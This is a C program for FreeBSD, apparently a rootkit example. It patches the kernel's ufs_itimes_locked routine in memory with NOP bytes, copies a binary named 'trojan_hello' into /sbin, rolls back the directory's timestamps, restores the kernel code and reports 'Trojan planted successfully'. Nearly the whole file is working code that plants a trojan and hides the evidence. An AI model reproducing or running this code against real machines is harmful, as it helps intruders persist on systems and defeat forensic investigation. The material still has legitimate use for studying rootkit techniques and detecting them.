#include <errno.h>
#include <fcntl.h>
#include <kvm.h>
#include <limits.h>
#include <nlist.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>

#define SIZE 		450
#define T_NAME		"trojan_hello"
#define DESTINATION	"/sbin/."

/* Replacement Code */
unsigned char nop4[] =
	"\x90\x90\x90\x90";	/* 4x nop */

unsigned char nop3[] = 
	"\x90\x90\x90";		/* 3x nop */

int main (int argc, char *argv[])
{
	int i, offset1, offset2, offset3, count1, count2, count3;
	char errbuf[_POSIX2_LINE_MAX];
	kvm_t *kd;
	struct nlist nl[] = { {NULL}, {NULL}, };
	unsigned char ufs_itimes_code[SIZE];

	struct stat sb;
	struct timeval time[2];

	/* Initialize kernel virtual memory access */
	kd = kvm_openfiles(NULL, NULL, NULL, O_RDWR, errbuf);
	if (kd == NULL)
	{
		fprintf(stderr, "ERROR: %s\n", errbuf);
		exit(-1);
	}

	nl[0].n_name = "ufs_itimes_locked";

	if (kvm_nlist(kd, nl) < 0)
	{
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	if (!nl[0].n_value)
	{
		fprintf(stderr, "ERROR: Symbol %s not found!\n", nl[0].n_name);
		exit(-1);
	}

	/* Save a copy of ufs_itimes */
	if (kvm_read(kd, nl[0].n_value, ufs_itimes_code, SIZE) < 0)
	{
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	/* Search through ufs_itimes for the following three lines:
	 * DIP_SET(ip, i_ctime, ts.tv_sec);
	 * DIP_SET(ip, i_ctimensec, ts.tv_nsec);
	 * DIP_SET(ip, i_modrev, DIP(ip, i_modrev) + 1);
	 *
	 * However, the bytes \x49\x8b\x4e\x38 appear 11 times
	 * before the instruction we want to nop. Similarly,
	 * \x49\x8b\x46\x38 appears 1 time before the one we want.
	 * Therefore, we have to keep looking until we find the 
	 * right one. */
	count1 = 0;	// Out of 11
	count3 = 0;	// Out of 1
	for ( i = 0 ; i < SIZE - 2 ; i++ )
	{
		if (	ufs_itimes_code[i] 	== 0x49 &&
			ufs_itimes_code[i+1] 	== 0x8b &&
			ufs_itimes_code[i+2] 	== 0x4e &&
			ufs_itimes_code[i+3]	== 0x38)
			if ( count1 == 11 )
				offset1 = i;
			else
				count1++;

		if (	ufs_itimes_code[i]	== 0x89 &&
			ufs_itimes_code[i+1]	== 0x41 &&
			ufs_itimes_code[i+2]	== 0x48)
			offset2 = i;

		if (	ufs_itimes_code[i]	== 0x49 &&
			ufs_itimes_code[i+1]	== 0x8b &&
			ufs_itimes_code[i+2]	== 0x46 &&
			ufs_itimes_code[i+3]	== 0x38)
			if ( count3 == 1 )
				offset3 = i;
			else
				count3++;
	}

	/* Save /sbin/'s access and modification times */
	if (stat("/sbin", &sb) < 0)
	{
		fprintf(stderr, "STAT ERROR: %d\n", errno);
		exit(-1);
	}

	/* time[] is an array of timeval's, but stat returns timespec's
	 * timespec = seconds + nanoseconds
	 * timeval  = seconds + microseconds */
	time[0].tv_sec 	= (time_t)sb.st_atim.tv_sec;
	time[0].tv_usec	= (long)sb.st_atim.tv_nsec / 1000;
	time[1].tv_sec 	= (time_t)sb.st_mtim.tv_sec;
	time[1].tv_usec	= (long)sb.st_mtim.tv_nsec / 1000;

	/* Patch ufs_itimes with nops */
	if (kvm_write(kd, nl[0].n_value + offset1, nop4, sizeof(nop4)-1) < 0)
	{
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}
	if (kvm_write(kd, nl[0].n_value + offset2, nop3, sizeof(nop3)-1) < 0)
	{
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}
	if (kvm_write(kd, nl[0].n_value + offset3, nop4, sizeof(nop4)-1) < 0)
	{
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	/* Copy T_NAME into DESTINATION */
	char string[] = "cp" " " T_NAME " " DESTINATION;
	system(string);

	/* Roll back /sbin/'s access and modification times */
	if (utimes("/sbin", (struct timeval *)&time) < 0)
	{
		fprintf(stderr, "UTIMES ERROR: %d\n", errno);
		exit(-1);
	}

	/* Restore ufs_itimes */
	if (kvm_write(kd, nl[0].n_value + offset1, &ufs_itimes_code[offset1], sizeof(nop4)-1) < 0)
	{
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}
	if (kvm_write(kd, nl[0].n_value + offset2, &ufs_itimes_code[offset2], sizeof(nop3)-1) < 0)
	{
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}
	if (kvm_write(kd, nl[0].n_value + offset3, &ufs_itimes_code[offset3], sizeof(nop4)-1) < 0)
	{
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	/* Close kd */
	if (kvm_close(kd) < 0)
	{
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	/* Print out a debug message, indicating our success */
	printf("Trojan planted successfully...\n");

	exit(0);
}
